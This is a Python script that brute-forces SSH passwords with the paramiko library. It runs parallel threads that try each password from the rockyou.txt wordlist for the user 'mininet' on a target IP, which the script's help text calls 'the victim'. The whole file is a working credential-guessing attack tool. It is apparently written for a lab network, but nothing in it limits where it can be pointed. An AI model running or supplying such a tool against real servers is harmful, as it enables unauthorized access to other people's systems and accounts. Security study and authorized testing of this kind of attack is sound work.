import paramiko
import argparse
import socket
import time
from threading import Thread, BoundedSemaphore

max_threads = 8  # Number of concurrent threads
connection_lock = BoundedSemaphore(value=max_threads)


def brute_force_ssh(hostname, port, user, password):
    # Log to a file for debugging purposes
    log = paramiko.util.log_to_file('log.log')

    # Create an SSH client object
    ssh_client = paramiko.SSHClient()

    # Load system host keys
    ssh_client.load_system_host_keys()

    # Automatically add unknown hosts to the list of known hosts
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        connection_lock.acquire()
        # Attempt SSH connection with the provided credentials
        print('Testing credentials {}:{}'.format(user, password))
        ssh_client.connect(hostname, port=port, username=user, password=password, timeout=5)
        print('Credentials OK {}:{}'.format(user, password))
    except paramiko.AuthenticationException as exception:
        print('AuthenticationException:', exception)
    except socket.error as error:
        print('SocketError:', error)
    finally:
        # Close the SSH client connection
        connection_lock.release()
        ssh_client.close()
def main():
    parser = argparse.ArgumentParser(description="SSH Bruteforce script")
    parser.add_argument("target_ip",    help="IP address of the victim")
    args = parser.parse_args()

    target_ip   =   args.target_ip
    port = 22

    # Read usernames from a file
    users = 'mininet'

    # Read passwords from a file
    passwords = open('rockyou.txt', 'r', encoding='latin-1').readlines()

    for password in passwords:
        password = password.strip()
        t = Thread(target=brute_force_ssh, args=(target_ip, port, users, password))
        t.start()


if __name__ == '__main__':
    main()
